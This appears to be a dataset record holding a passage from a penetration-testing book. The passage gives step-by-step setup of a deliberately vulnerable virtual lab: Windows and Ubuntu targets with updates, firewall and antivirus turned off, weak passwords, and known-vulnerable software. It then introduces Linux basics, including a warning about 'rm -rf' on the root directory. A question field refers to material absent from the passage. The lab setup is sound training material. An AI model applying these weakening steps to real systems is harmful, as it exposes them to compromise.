Create A New Virtual Machine in VMware Player and point\nthe New Virtual Machine Wizard to the Windows XP installation disk\nor ISO image. Depending on your source disk or image, you may be\noffered the option to use Easy Install (if you’re installing a version with\na license key), or you may see a yellow triangle warning, “Could not\ndetect which operating system is in this disc image. You will need to\nspecify which operating system will be installed.” In the latter case, just\npress Next. 2. In the Select a Guest Operating System dialog, select Microsoft Windows\nin the Guest operating system section and your version of Windows XP in\nthe drop-down box, as shown in Figure 1-20, and press Next. Figure 1-20: Selecting your version of Windows XP\nSetting Up Your Virtual Lab 29\n3. In the next dialog, enter Bookxp XP SP3 as the name of your virtual\nmachine and press Next. 4. In the Specify Disk Capacity dialog, accept the recommended hard disk\nsize for your virtual machine of 40GB and check the box for Store vir-\ntual disk as a single file, as shown in Figure 1-21, and press Next. Figure 1-21: Specifying the disk capacity\nnote The Virtual Machine will not take up the entire 40GB; it will only take up space on\nyour hard drive as needed. This is just a maximum value. 5. In the Ready to Create Virtual Machine dialog, shown in Figure 1-22,\nclick Customize Hardware. Figure 1-22: Customizing your hardware\n30 Chapter 1\n6. In the Hardware dialog, choose Network Adapter, and in the Network\nConnection field that appears, select Bridged: Connected directly to\nthe physical network. Next, click Configure Adapters and select the\nadapter you’re using to connect to the Internet, as shown in Figure 1-23. Then press OK, Close, and Finish. Figure 1-23: Configuring your network adapter as bridged\nYou should now be able to play your Windows XP virtual machine. Continue to the instructions for installing and activating Windows XP\nin “Installing and Activating Windows” on page 32. VMware Fusion on Mac OS\nIn VMware Fusion, go to File4New4Import from disk or image\nand point it to the Windows XP installation disk or image, as shown\nin Figure 1-24. Follow the prompts to create a fresh installation of Windows XP SP3. Setting Up Your Virtual Lab 31\nFigure 1-24: Creating a new virtual machine\nInstalling and Activating Windows\nAs part of the installation process, you will be prompted for a Windows\nlicense key. If you have one, enter it here. If not, you should be able to use\nthe virtual machine on a trial basis for 30 days. To continue without enter-\ning a license key, click Next when prompted for the key. A pop-up will warn\nyou that entering a license key is recommended and ask if you would like to\nenter one now, as shown in Figure 1-25. Just click No. Figure 1-25: License key dialog\n32 Chapter 1\nAs shown in Figure 1-26, when prompted, set Computer name to Bookxp. Set Administrator password to password. Figure 1-26: Setting the computer name and Administrator password\nYou can leave the date/time and TCP/IP settings at their defaults when\nprompted. Likewise, leave the Windows XP target as part of the workgroup\nWORKGROUP instead of joining it to a domain, as shown in Figure 1-27. Figure 1-27: Workgroup settings\nSetting Up Your Virtual Lab 33\nTell Windows not to automatically install security updates, as shown in\nFigure 1-28. This step is important, because some of the exploits we will run\nrely on missing Windows patches. Figure 1-28: Turning off automatic security updates\nYou will then be prompted to activate Windows. If you entered a license\nkey, go ahead and activate it. Otherwise you can choose No, remind me\nevery few days, as shown in Figure 1-29. Figure 1-29: Activating Windows\n34 Chapter 1\nNow create user accounts georgia and secret, as shown in Figure 1-30. We\nwill create passwords for these users after setup is finished. Figure 1-30: Adding users\nWhen Windows starts up, log in as the user georgia with no\npassword. Installing VMware Tools\nNow install VMware Tools, which will make it easier to use your virtual\nmachine by, for example, letting you copy/paste and drag programs onto\nthe virtual machine from the host system. VMware Player on Microsoft Windows\nIn VMware Player, install VMware Tools from Player4Manage4Install\nVMware Tools, as shown in Figure 1-31. The VMware Tools installer should\nautomatically run in Windows XP. Setting Up Your Virtual Lab 35\nFigure 1-31: Installing VMware Tools in VMware Player\nVMware Fusion on Mac OS\nInstall VMware Tools from Virtual Machines4Install VMware Tools, as\nshown in Figure 1-32. The VMware Tools installer should automatically run\nin Windows XP. Figure 1-32: Installing VMware Tools in VMware Fusion\n36 Chapter 1\nTurning Off Windows Firewall\nNow open the Control Panel from the Windows Start menu. Click Security\nCenter4Windows Firewall to turn off the Windows Firewall, as shown in\nFigure 1-33. Figure 1-33: Turning off the Windows firewall\nSetting User Passwords\nAgain in the Control Panel, go to User Accounts. Click the user georgia\nand then select Create a password. Set georgia’s password to password, as\nshown in Figure 1-34. Do the same thing for the user secret, but set secret’s\npassword to Password123. Figure 1-34: Setting a user password\nSetting Up Your Virtual Lab 37\nSetting a Static IP Address\nNext, set a static IP address so your networking information won’t change\nas you work through the book. But first we need to figure out the address\nof our default gateway. Ensure that your Windows XP system is set to use bridged networking\nin VMware. By default, your virtual machine will automatically pull an IP\naddress using DHCP. To find the default gateway, open a Windows command prompt by\ngoing to Start4Run, entering cmd, and clicking OK. In the command\nprompt, enter ipconfig. This will show you the networking information,\nincluding the default gateway. C:\\Documents and Settings\\georgia>ipconfig\nWindows IP Configuration\nEthernet adapter Local Area Connection:\nConnection-specific DNS Suffix . : XXXXXXXX\nIP Address. . . . . . . . . . . . : 192.168.20.10\nSubnet Mask . . . . . . . . . . . : 255.255.255.0\nDefault Gateway . . . . . . . . . : 192.168.20.1\nC:\\Documents and Settings\\georgia>\nIn my case, the IP address is 192.168.20.10, the subnet mask is\n\n255.255.255.0, and the default gateway is 192.168.20.1. 1. In the Control Panel, go to Network and Internet Connections and\nclick Network Connections at the bottom of the screen. 2. Right-click Local Area Connection and then select Properties. 3. Highlight Internet Protocol (TCP/IP) and select Properties. Now\nenter a static IP address and set the Subnet mask and Default gateway\nto match the data you found with the ipconfig command, as shown in\nFigure 1-35. Set the Preferred DNS server to your default gateway as well. Now it’s time to see if our virtual machines can communicate. Once\nyou’re sure that the settings match, return to the Kali virtual machine (start\nit if you had shut it down) and enter ping <static ip address of your Windows\nXP virtual machine>, as shown here. note My IP address is 192.168.20.10. Throughout the book, you should replace this\nvalue with the IP address of your systems. root@kali:~# ping 192.168.20.10\nPING 192.168.20.10 (192.168.20.10) 56(84) bytes of data. 64 bytes from 192.168.20.10: icmp_req=1 ttl=128 time=3.06 ms\n^C\n38 Chapter 1\nFigure 1-35: Setting a static IP address\nEnter ctrl-C to stop the ping command. If you see output beginning\nwith 64 bytes from <ip address of XP>, as shown previously, your virtual\nmachines are able to communicate. Congratulations! You’ve set up a net-\nwork of virtual machines. If instead you see a message including the text Destination Host\nUnreachable, troubleshoot your networking: Make sure your virtual\nmachines are on the same bridged virtual network, check that your\ndefault gateway is correct, and so on. Making XP Act Like It’s a Member of a Windows Domain\nFinally, we need to modify a setting in Windows XP so that it will behave as\nif it were a member of a Windows domain, as many of your clients will be. I’m not having you set up an entire Windows domain here, but during post\nexploitation, a couple of exercises will simulate a domain environment. Return to your XP virtual machine and follow these steps. 1. Select Start4Run and enter secpol.msc to open the Local Security\nSettings panel. 2. Expand Local Policies on the left and double-click Security Options\non the right. 3. In the Policy list in the pane on the right, double-click Network access:\nSharing and security model for local accounts and choose Classic\n- local users authenticate as themselves from the drop-down list, as\nshown in Figure 1-36. Setting Up Your Virtual Lab 39\nFigure 1-36: Changing a local security setting to make your target act like a member of a\nWindows domain\n4. Click Apply and then OK. 5. Close any open windows in your virtual machine. Installing Vulnerable Software\nIn this section we’ll install some vulnerable software on our Windows XP\nvirtual machine. We’ll be attacking this software in later chapters. Open\nyour Windows XP virtual machine and, while still logged in as user georgia,\nfollow the directions to install each of the packages listed here. Zervit 0.4\nDownload Zervit version 0.4 from http://www.exploit-db.com/exploits/12582/. (Click the Vulnerable App option to download the files.) Unzip the down-\nloaded archive and double-click the Zervit program to open and run it. Then enter port number 3232 in the console when the software starts. Answer Y to allowing directory listing, as shown in Figure 1-37. Zervit will\nnot automatically restart when you reboot Windows XP, so you will need to\nrestart it if you reboot. 40 Chapter 1\nFigure 1-37: Starting Zervit 0.4\nSLMail 5.5\nDownload and run SLMail version 5.5 from http://www.exploit-db.com/\nexploits/638/, using the default options when prompted. Just click Next for\nall of the options and don’t change anything. If you get a warning about a\ndomain name, just ignore it and click OK. We don’t really need to deliver\nany email here. Once SLMail is installed, restart your virtual machine. Then open\nStart4All Programs4SL Products4SLMail4SLMail Configuration. In the Users tab (default), right-click the SLMail Configuration window\nand choose New4User, as shown in Figure 1-38. Figure 1-38: Adding a user in SLMail\nSetting Up Your Virtual Lab 41\nClick the newly created user icon, enter username georgia, and fill in\nthe information for the user, as shown in Figure 1-39. The mailbox name\nshould be georgia with password password. Keep the defaults and press OK\nonce you’ve finished. Figure 1-39: Setting the user information in SLMail\n3Com TFTP 2.0.1\nNext, download 3Com TFTP version 2.0.1 as a zipped file from http://www\n.exploit-db.com/exploits/3388/. Extract the files and copy 3CTftpSvcCtrl and\n3CTftpSvc to the directory C:\\Windows, as shown in Figure 1-40. Figure 1-40: Copying 3Com TFTP to C:\\Windows\n42 Chapter 1\nThen open 3CTftpSvcCtrl (the blue 3 icon) and click Install Service, as\nshown in Figure 1-41. Figure 1-41: Installing 3Com TFTP\nClick Start Service to start 3Com TFTP for the first time. From now on, it\nwill automatically start when you boot up the computer. Press Quit to exit. XaMPP 1.7.2\nNow we’ll install an older version of the XAMPP software, version 1.7.2, from\nhttp://www.oldapps.com/xampp.php?old_xampp=45/. (The older version of\nInternet Explorer on Windows XP seems to have some trouble opening this\npage. If you have trouble, download the software from your host system and\ncopy it onto Windows XP’s desktop.)\n1. Run the installer and accept the default options as they’re presented to\nyou. When installation is finished, choose option 1. start XAMPP Control\nPanel, as shown in Figure 1-42. Figure 1-42: Starting XAMPP Control Panel\nSetting Up Your Virtual Lab 43\n2. In the XAMPP Control Panel, install the Apache, MySQL, and FileZilla\nservices (select the Svc checkbox to the left of the service name). Then\nclick the Start button for each service. Your screen should look like the\none shown in Figure 1-43. Figure 1-43: Installing and starting XAMPP services\n3. Click the Admin button for FileZilla in the XAMPP Control Panel. The\nAdmin panel is shown in Figure 1-44. Figure 1-44: FileZilla Admin panel\n4. Go to Edit4Users to open the Users dialog, shown in Figure 1-45. 5. Click the Add button on the right of the dialog box. 6. In the Add User Account dialog box, enter georgia and press OK. 44 Chapter 1\nFigure 1-45: Adding an FTP user\n7. With georgia highlighted, check the Password box under Account\nSettings and enter password. Click OK. When prompted to share a folder, browse to the georgia’s\nDocuments folder on Windows and select it to share it, as shown in Figure 1-46. Leave the defaults for all other checkboxes, as shown in the figure. Click\nOK once you’ve finished and exit the various open windows. Figure 1-46: Sharing a folder via FTP\nSetting Up Your Virtual Lab 45\nadobe acrobat Reader\nNow we’ll install Adobe Acrobat Reader version 8.1.2 from http://www.oldapps\n.com/adobe_reader.php?old_adobe=17/. Follow the default prompts to install it. Click Finish once you’re done. (Here again you may need to download the\nfile to your host system and copy it to Windows XP’s desktop.)\nWar-FTP\nNext, download and install War-FTP version 1.65 from http://www.exploit-db\n.com/exploits/3570/. Download the executable from exploit-db.com to georgia’s\ndesktop and run the downloaded executable to install. You do not need to\nstart the FTP service; we will turn it on when we discuss exploit develop-\nment in Chapters 16 through 19. WinSCP\nDownload and install the latest version of WinSCP from http://winscp.net/. Choose the Typical Installation option. You can uncheck the additional\nadd-ons. Click Finish once you’re done. Installing Immunity Debugger and Mona\nNow we’ll finish up the Windows XP virtual machine by installing a debug-\nger, a tool that helps detect errors in computer programs. We’ll be using\nthe debugger in the exploit development chapters. Visit the Immunity\nDebugger registration page at http://debugger.immunityinc.com/ID_register.py. Complete the registration and then press the Download button. Run the\ninstaller. When asked if you want to install Python, click Yes. Accept the license\nagreement and follow the default installation prompts. When you close the\ninstaller, the Python installation will automatically run. Use the default\ninstallation values. Once Immunity Debugger and Python have been installed, download\nmona.py from http://redmine.corelan.be/projects/mona/repository/raw/mona.py/. Copy mona.py to C:\\Program Files\\Immunity Inc\\Immunity Debugger\\PyCommands,\nas shown in Figure 1-47. Open Immunity Debugger, and at the command prompt at the bottom\nof the window, enter !mona config -set workingfolder c:\\logs\\%p, as shown in\nFigure 1-48. This command tells mona to log its output to C:\\logs\\<program\nname>, where <program name> is the program Immunity Debugger is cur-\nrently debugging. Now our Windows XP target is set up and ready to go. 46 Chapter 1\nFigure 1-47: Installing Mona\nFigure 1-48: Setting up Mona’s logs\nSetting Up Your Virtual Lab 47\nsetting up the ubuntu 8.10 target\nBecause Linux is open source, you can simply download the Linux vir-\ntual machine as part of the torrent for this book. Unzip the 7-Zip archive\nBookUbuntu.7zip and use the password 1stPentestBook?! to open the archive. Open the .vmx file in VMware. If you are prompted with a message that\nsays the virtual machine appears to be in use, click Take Ownership and,\nas with Kali, select I copied it. The username and password for the virtual\nmachine itself are georgia:password. Once you have the Ubuntu virtual machine loaded, make sure the net-\nwork interface is set to Bridged in VMware and click the networking icon\n(two computers) at the top right of the screen to attach the virtual machine\nto the network. Do not install any updates if prompted. As with Windows XP,\nwe will exploit out-of-date software on this system. Now this virtual machine\nis all set up. (I’ll show you how to set a static IP address in Linux in Chapter 2.)\nCreating the windows 7 target\nAs with Windows XP, you’ll need to install a copy of Windows 7 SP1 in\nVMware by loading your image or DVD. A 30-day trial version of 32-bit\nWindows 7 Professional SP1 will work fine, but you’ll need to activate it after\n30 days if you wish to continue using it. To find a legal version of Windows 7\nSP1, try one of the following:\n• Visit http://www.softpedia.com/get/System/OS-Enhancements/Windows-7.shtml. • Visit http://technet.microsoft.com/en-us/evalcenter/dn407368. note Your school or workplace may have access to programs like DreamSpark or BizSpark\nthat give you access to Windows operating systems. You can also check my website\n(http://www.bulbsecurity.com/) for more resources. Creating a User Account\nAfter installing Windows 7 Professional SP1, opt out of security updates and\ncreate user Georgia Weidman as an administrator with a password of pass-\nword, as shown in Figures 1-49 and 1-50. Again opt out of automatic updates. When prompted, set the comput-\ner’s current location to a work network. Once the installation has finished,\nlog in to the account Georgia Weidman. Leave the Windows Firewall enabled. VMware will reboot Windows 7 a few times as it installs everything. Now tell VMware to install VMware Tools, as you did in the Windows XP\nsection. After instructing VMware to install VMware Tools in the virtual\nmachine, if the installer does not automatically run, go to My Computer\nand run the VMware Tools installer from the virtual machine’s DVD drive,\nas shown in Figure 1-51.",
    "question": "What is the purpose of the Smartphone Pentest Framework mentioned in the text?",
    "summary": "The book provides a hands-on introduction to penetration testing, focusing on setting up a virtual lab with Kali Linux and various target systems to practice security testing. It explains the phases of pentesting, including information gathering, threat modeling, vulnerability analysis, exploitation, and reporting, while emphasizing the importance of understanding the security posture of a company. The book also includes practical exercises and real-world scenarios to help readers develop the skills needed to identify and exploit vulnerabilities in systems and networks."
  },
  {
    "start": 17,
    "end": 19,
    "text": "48 Chapter 1\nFigure 1-49: Setting a username\nFigure 1-50: Setting a password for the user Georgia Weidman\nSetting Up Your Virtual Lab 49\nFigure 1-51: Installing VMware Tools\nOpting Out of Automatic Updates\nThough our attacks on Windows 7 will largely rely on flaws in third-party\nsoftware rather than missing Windows patches, let’s once again opt out of\nWindows updates for this virtual machine. To do this, go to Start4Control\nPanel4System and Security. Then under Windows Update, click Turn\nAutomatic Updating On or Off. Set Important updates to Never check for\nupdates (not recommended) as shown in Figure 1-52. Click OK. Figure 1-52: Opting out of automatic updates\n50 Chapter 1\nSetting a Static IP Address\nSet a static IP address by choosing Start4Control Panel4Network and\nInternet4Network and Sharing Center4Change Adapter Settings4Local\nArea Network. Now right-click and choose Properties4Internet Protocol\nVersion 4 (TCP/IPv4)4Properties. Set these values as you did for Windows\nXP (discussed in “Setting a Static IP Address” on page 38), but use a dif-\nferent value for the Windows 7 IP address, as shown in Figure 1-53. If asked\nwhether to configure this network as Home, Work, or Public, choose Work. (Be sure that your virtual machine network setting is configured to use a\nbridged adapter.)\nFigure 1-53: Setting a static IP address\nBecause the Windows firewall is turned on, Windows 7 won’t respond\nto a ping from our Kali system. Therefore, we’ll ping our Kali system\nfrom Windows 7. Start your Kali Linux virtual machine, and from your\nWindows 7 virtual machine, click the Start button. Then enter cmd in the\nRun dialog to open a Windows command prompt. At the prompt, enter\nthe following. ping <IP Address of Kali>\nIf everything is working, you should see replies to the ping request as in\n“Setting a Static IP Address” on page 38. Setting Up Your Virtual Lab 51\nAdding a Second Network Interface\nNow shut down your Windows 7 virtual machine. We’re going to add a\nsecond network interface to the Windows 7 virtual machine that will allow\nthe Windows 7 system to be part of two networks. We’ll use this setup dur-\ning post exploitation to simulate attacking additional systems on a second\nnetwork. In VMware Player on Microsoft Windows, choose Player4Manage4\nVirtual Machine Settings4Add, select Network Adapter, and press Next. This adapter will be Network Adapter 2. In VMware Fusion on Mac OS,\ngo to Virtual Machine Settings, select Add a Device, and select a network\nadapter. Set this new adapter to the Host Only network. Press OK, and the\nvirtual machine should restart. (We do not need to set a static IP address\nfor Network Adapter 2.) When the virtual machine restarts, open Virtual\nMachine Settings again, and you should see the two network adapters\nlisted. Both should be connected when your computer powers on. Installing Additional Software\nNow install the following software in your Windows 7 virtual machine,\nusing default settings across the board:\n• Java 7 Update 6, an out-of-date version of Java, from http://www.oldapps\n.com/java.php?old_java=8120/. • Winamp version 5.55 from http://www.oldapps.com/winamp.php?old_\nwinamp=247/. (Uncheck the changes to your search engine and\nso on.)\n• The latest version of Mozilla Firefox from http://www.mozilla.org/. • Microsoft Security Essentials from http://windows.microsoft.com/en-us/\nwindows/security-essentials-download/. (Download the latest antivirus sig-\nnatures, making sure to download the correct version for your 32-bit\nWindows install. Don’t turn on automatic sample submission or scan on\ninstall. Also, disable real-time protection for now. We will enable this\nfeature when we study bypassing antivirus software in Chapter 12. This\nsetting can be found on the Settings tab under Real-time Protection. Uncheck Turn on real-time protection (recommended), as shown in\nFigure 1-54. Click Save changes.)\n52 Chapter 1\nFigure 1-54: Turning off real-time protection\nFinally, install the BookApp custom web application found in the torrent\nfor this book. (1stPentestBook?! is the password for the archive.) Drag and\ndrop the BookApp folder on the Windows 7 virtual machine. Then follow\nthe instructions in InstallApp.pdf detailing how to install BookApp. Here is\na high-level overview of the instructions. 1. Run Step1-install-iis.bat as an administrator by right-clicking the .bat file\nand choosing Run as administrator. (Once install finishes, you can close\nany DOS windows that are still up.)\n2. Navigate to the SQL folder and run SQLEXPRWT_x86_ENU.EXE. Detailed\ninstructions with screenshots are included in the InstallApp PDF. 3. Install Service Pack 3 by running SQLServer2008SP3-KB2546951-x86-ENU\n.exe. When warned that program has known compatibility issues, click\nOK to run it and complete the install. Choose to accept any changes. 4. Using SQL Server Configuration Manager, enable Named Pipes. Setting Up Your Virtual Lab 53\n5. Navigate back to the main app folder and run Step2-Modify-FW.bat as an\nadministrator. 6. Install XML support for MS SQL with sqlxml_x86-v4.exe from the SQL\nfolder. 7. Run Step3-Install-App.bat as an administrator from the main app folder. 8. Use MS SQL Management Studio to run db.sql from the SQL folder, as\ndescribed in detail in the InstallApp PDF. 9. Finally, change the user permissions on the AuthInfo.xml file in the book\napp folder to give full permissions to IIS_USERS. summary\nWe set up our virtual environment, downloaded and customized Kali Linux\nfor attacks, configured our virtual network, and configured our target oper-\nating systems—Windows XP, Windows 7, and Ubuntu. In the next chapter, we will get used to working with the Linux command\nline, and we’ll be on our way to learning how to use the many pentesting\ntools and techniques in this book. 54 Chapter 1\n2\nusing k ali linux\nYou will use Kali Linux as the attack platform through-\nout this book. Kali, the successor to the popular\nBackTrack Linux, is a Debian-based distribution that\ncomes with a plethora of penetration testing tools\npreinstalled and preconfigured. Anyone who’s ever\ntried to set up a pentesting box from scratch the day\nbefore a big engagement knows that getting everything working correctly\ncan be a real pain. Having everything preconfigured in Kali can save a lot\nof time and headaches. Kali Linux works just like the standard Debian\nGNU/Linux distribution, with a lot of extra tools. Rather than point and click your way through Kali, you’ll use the Linux\ncommand line because that’s where the real power lies. In this chapter we’ll\nlook at how to perform some common Linux tasks from the command line. If you’re already a Linux expert, you can skip this chapter and move on to\nChapter 3; if not, take some time and dive in. Linux Command Line\nThe Linux command line looks like this:\nroot@kali:~#\nLike a DOS prompt or the Mac OS terminal, the Linux command\nline gives you access to a command processor called Bash that allows you\nto control the system by entering text-based instructions. When you open\nthe command line you’ll see the prompt root@kali#. Root is the superuser\non Linux systems, and it has complete control of Kali. To perform operations in Linux, you enter commands along with any\nrelevant options. For example, to view the contents of root’s home directory,\nenter the command ls as shown here. root@kali:~# ls\nDesktop\nAs you can see, there’s not much in the root directory, only a folder\ncalled Desktop. the Linux Filesystem\nIn the Linux world, everything is a file: keyboards, printers, network\ndevices—everything. All files can be viewed, edited, deleted, created,\nand moved. The Linux filesystem is made up of a series of directories\nthat branch off from the root of the filesystem (/). To see your current directory, enter pwd at the terminal:\nroot@kali:~# pwd\n/root\nChanging Directories\nTo move to another directory, enter cd directory using either the absolute or\nrelative path to the new directory, based your current location. The absolute\npath is the path to a file in relation to the root directory (/). For example, to\nchange to your desktop from anywhere, you could enter the absolute path\nto the desktop with cd /root/Desktop to reach the root user’s desktop. If you\nwere in the directory /root (the root user’s home directory), you could use\nthe relative path to the desktop (that is, relative to your current location) by\nentering cd Desktop, which would also take you to the desktop. The command cd .. takes you back one level in the filesystem, as\nshown here. root@kali:~/Desktop# cd .. root@kali:~/# cd ../etc\nroot@kali:/etc#\n56 Chapter 2\nEntering cd .. from root’s Desktop directory takes us back to root’s home\ndirectory. Entering cd ../etc from there moves us back up to the root of the\nfilesystem and then to the /etc directory. Learning about Commands: the man Pages\nTo learn more about a command and its options and arguments, you can\nview its documentation (called its manual page, or man page) by entering man\ncommand. For example, to learn more about the ls command enter man ls as\nshown in Listing 2-1. root@kali:~# man ls\nLS(1) User Commands LS(1)\n\nNAME\nls - list directory contents\n\nSYNOPSIS\nls [OPTION]... [FILE]... u\nDESCRIPTION v\nList information about the FILEs (the current directory by default). Sort entries alphabetically if none of -cftuvSUX nor --sort is speci-\nfied. Mandatory arguments to long options are mandatory for short options\ntoo. -a, --all w\ndo not ignore entries starting with . -A, --almost-all\ndo not list implied . and .. --snip--\n-l use a long listing format\n--snip--\nListing 2-1: Linux man page\nThe man page gives useful (if a bit unfriendly looking) information\nabout the ls command including its usage u, description v, and available\noptions w. As you can see in the description section at v, the ls command lists all\nfiles in the current working directory by default, but you can also use ls to\nget information about a particular file. For example, according to the man\npage you can use the -a option with ls to show all files, including hidden\ndirectories—directories not shown in the default ls listing—as shown in\nListing 2-2. Using Kali Linux 57\nroot@kali:~# ls -a\n. .mozilla\n.. .msf4\n.android .mysql_history\n.bash_history .nano_history\n--snip--\nListing 2-2: Using an option with ls\nAs you can see, there are several hidden directories in the root direc-\ntory, all of which are preceded by a period (.) character. (In Chapter 8,\nwe’ll see how these sometimes-hidden directories can lead to a system com-\npromise.) You can also see the entries . and .., which denote the current\ndirectory and the parent directory, respectively. user Privileges\nLinux user accounts offer resources to a particular individual or service. A user may log in with a password and be offered certain resources on the\nLinux system, such as the ability to write files and browse the Internet. That user may not be able to see files that belong to other users and can\nhave reasonable assurance that other users can’t see his or her files either. In addition to traditional user accounts used by a person who logs in with a\npassword and accesses the system, Linux systems can allow software to have\na user account. The software can have the ability to use system resources\nto do its job, but it cannot read other users’ private files. The accepted best\npractice on Linux systems is to run day-to-day commands as an unprivileged\nuser account instead of running everything as the privileged root user to\navoid inadvertently harming your system or granting excessive privilege to\nthe commands and applications you run. Adding a User\nBy default, Kali offers only the privileged root account. Though many\nsecurity tools require root privileges to run, you may want to add another\nunprivileged account for everyday use to reduce the potential for damage\nto your system. Remember, the root account can do anything on Linux,\nincluding corrupting all of your files. To add a new user georgia to your Kali system use the adduser command,\nas shown in Listing 2-3. root@kali:~# adduser georgia\nAdding user `georgia' ... Adding new group `georgia' (1000) ... Adding new user `georgia' (1000) with group `georgia' ... u\nCreating home directory `/home/georgia' ... v\nCopying files from `/etc/skel' ... Enter new UNIX password: w\nRetype new UNIX password:\n58 Chapter 2\npasswd: password updated successfully\nChanging the user information for georgia\nEnter the new value, or press ENTER for the default\nFull Name []: Georgia Weidman x\nRoom Number []:\nWork Phone []:\nHome Phone []:\nOther []:\nIs the information correct? [Y/n] Y\nListing 2-3: Adding a new user\nAs you can see, in addition to adding a user to the system, a group georgia\nis created, a new user is added to this group u, a home directory is created\nfor the user v, and the system prompts for information about the user, such\nas a password w and the user’s full name x. Adding a User to the sudoers File\nWhen you need to do something that requires root privileges as a regular\nuser, use the sudo command along with the command that you want to run\nas root, and then enter your password. For the newly created user georgia\nto be able to run privileged commands you need to add her to the sudoers\nfile, which specifies which users can use the sudo command. To do so, enter\nadduser username sudo as shown here. root@kali:~# adduser georgia sudo\nAdding user 'georgia' to group `sudo' ... Adding user georgia to group sudo\nDone. Switching Users and Using sudo\nTo switch users in your terminal session, say from the root user to georgia,\nuse the su command as shown in Listing 2-4. root@kali:~# su georgia\ngeorgia@kali:/root$ adduser john\nbash: adduser: command not found u\ngeorgia@kali:/root$ sudo adduser john\n[sudo] password for georgia:\nAdding user `john' ... v\nAdding new group `john' (1002) ... Adding new user `john' (1002) with group `john' ... --snip--\ngeorgia@kali:/root$ su\nPassword:\nroot@kali:~#\nListing 2-4: Switching to a different user\nUsing Kali Linux 59\nYou switch users with the su command. If you try to run commands\n(such as the adduser command) that require more privileges than the cur-\nrent user (georgia), the command is unsuccessful (command not found) u\nbecause you can run the adduser command only as root. Luckily, as discussed previously, you can use the sudo command to run\na command as root. Because the georgia user is a member of the sudo group,\nyou can run privileged commands, and you can see user john is added v to\nthe system. To change back to the root user, enter the su command with no user-\nname. You will be prompted for the root’s password (toor). Creating a New File or Directory\nTo create a new, empty file called myfile, use the touch command. root@kali:# touch myfile\nTo create a new directory in your current working directory, enter mkdir\ndirectory as shown here. root@kali:~# mkdir mydirectory\nroot@kali:~# ls\nDesktop mydirectory myfile\nroot@kali:~# cd mydirectory/\nUse ls to confirm that the new directory has been created, and then\nchange to mydirectory using cd. Copying, Moving, and Removing Files\nTo copy a file, use the cp command as shown here. root@kali:/mydirectory# cp /root/myfile myfile2\nThe syntax is cp source destination. When using cp, the original file is\nleft in place, and a copy is made at the desired destination. Similarly, you can move a file from one location to another using the\nmv command. The syntax is identical to cp, but this time the file is removed\nfrom the source location. You can remove a file from the filesystem by entering rm file. To\nremove files recursively use the -r command. warning Be careful when removing files, particularly recursively! Some hackers joke that the\nfirst command to teach Linux beginners is rm -rf from the root directory, which forci-\nbly deletes the entire filesystem. This teaches new users the power of performing actions\nas root. Don’t try that at home! 60 Chapter 2\nAdding Text to a File\nThe echo command echoes what you enter to the terminal, as shown here. root@kali:/mydirectory# echo hello georgia\nhello georgia\nTo save text to a file, you can redirect your input to a file instead of to\nthe terminal with the > symbol. root@kali:/mydirectory# echo hello georgia > myfile\nTo see the contents of your new file you can use the cat command. root@kali:/mydirectory# cat myfile\nhello georgia\nNow echo a different line of text into myfile as shown next. root@kali:# echo hello georgia again > myfile\nroot@kali:/mydirectory# cat myfile\nhello georgia again\nThe > overwrites the previous contents of the file. If you echo another\nline into myfile, that new line overwrites the output of the previous com-\nmand. As you can see, the contents of myfile now reads hello georgia again. Appending Text to a File\nTo append text to a file, use >> as shown here. root@kali:/mydirectory# echo hello georgia a third time >> myfile\nroot@kali:/mydirectory# cat myfile\nhello georgia again\nhello georgia a third time\nAs you can see, appending preserves the previous contents of the file. File Permissions\nIf you look at the long output of ls -l on myfile, you can see the current per-\nmissions for myfile. root@kali:~/mydirectory# ls -l myfile\n-rw-r--r-- 1 root root 47 Apr 23 21:15 myfile\nFrom left to right you see the file type and permissions (-rw-r—r--), the\nnumber of links to the file (1), the user and group that own the file (root),\nthe file size (47 bytes), the last time the file was edited (April 23, 21:15), and\nfinally the filename (myfile). Using Kali Linux 61\nLinux files have permissions to read (r), write (w), and execute (x) and\nthree sets of user permissions: permissions for the owner, the group, and\nall users. The first three letters denote the permissions for the owner, the\nfollowing three denote the permissions for the group, and the final three\ndenote the permissions for all users. Since you created myfile from the root\nuser account, the file is owned by user root and group root, as you can see in\nthe output with root root. User root has read and write permissions for the\nfile (rw). Other users in the group, if there are any, can read the file (r) but\nnot write to or execute it. The last r shows that all users on the filesystem\ncan read the file. To change permissions on a file, use the chmod command. You can use\nchmod to specify permissions for the owner, the group, and the world. When\nspecifying permissions use the numbers from 0 through 7 as shown in\nTable 2-1. table 2-1: Linux File Permissions\nInteger Value Permissions Binary representation\n7 full 111\n6 read and write 110\n5 read and execute 101\n4 read only 100\n3 write and execute 011\n2 write only 010\n1 execute only 001\n0 none 000\nWhen entering new file permissions, you use one digit for the owner,\none for the group, and one for world. For example, to give the owner full\npermissions but the group and the world no permissions to read, write, or\nexecute a file, use chmod 700 like this:\nroot@kali:~/mydirectory# chmod 700 myfile\nroot@kali:~/mydirectory# ls -l myfile\n-rwx------u 1 root root 47 Apr 23 21:15 myfile\nNow when you run the ls -l command on myfile, you can see that root\nhas read, write, and execute (rwx) permissions and the other sets are blank u. If you try to access the file as any user other than root, you’ll get a permis-\nsion denied error. editing Files\nPerhaps no debate brings out such passion among Linux users as which is\nthe best file editor. We’ll look at the basics of using two popular editors, vi\nand nano, beginning with my favorite, nano. 62 Chapter 2\nroot@kali:~/mydirectory# nano testfile.txt\nOnce in nano you can begin adding text to a new file called testfile.txt. When you open nano, you should see a blank file with help information for\nnano shown at the bottom of the screen, as shown here. [ New File ]\n^G Get Help ^O WriteOut ^R Read File ^Y Prev Page ^K Cut Text ^C Cur Pos\n^X Exit ^J Justify ^W Where Is ^V Next Page ^U UnCut Text^T To Spell\nTo add text to the file, just start typing. Searching for Text\nTo search for text in a file, use ctrl-W, and then enter the text to search for\nat the search prompt as shown next. --snip--\nSearch:georgia\n^G Get Help ^Y First Line^T Go To Line^W Beg of ParM-J FullJstifM-B Backwards\n^C Cancel ^V Last Line ^R Replace ^O End of ParM-C Case SensM-R Regexp\nNano should find the text georgia if the word is in the file. To exit,\npress ctrl-X. You will be prompted to save the file or lose the changes,\nas shown here:\n--snip--\nSave modified buffer (ANSWERING \"No\" WILL DESTROY CHANGES) ? Y\nY Yes\nN No ^C Cancel\nEnter Y to save the file. Now we’ll edit the file with the vi editor. Editing a File with vi\nAdd the text in Listing 2-5 to testfile.txt. In addition to the contents of the\nfile, at the bottom of the vi screen you see some information including the\nfilename, number of lines, and the current cursor position (see Listing 2-5).",
